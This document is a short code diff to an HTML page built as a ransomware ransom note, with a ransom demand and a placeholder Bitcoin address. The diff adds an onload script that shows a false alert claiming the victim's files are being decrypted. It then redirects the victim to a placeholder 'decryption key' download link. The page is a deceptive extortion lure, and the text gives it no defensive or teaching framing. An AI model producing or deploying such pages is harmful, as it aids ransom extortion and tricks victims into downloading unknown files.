@@ -19,8 +19,14 @@
             font-size: 1.5em;
         }
     </style>
+    <script>
+        function showPopup() {
+            alert("Your files are being decrypted. Click OK to download the decryption key.");
+            window.location.href = "[FakeDecryptionKeyDownloadLink]";
+        }
+    </script>
 </head>
-<body>
+<body onload="showPopup()">
     <h1>Ransomware Attack!</h1>
     <p>Your files have been encrypted. Pay the ransom to get the decryption key.</p>
     <p>Bitcoin Address: [YourFakeBitcoinAddress]</p>
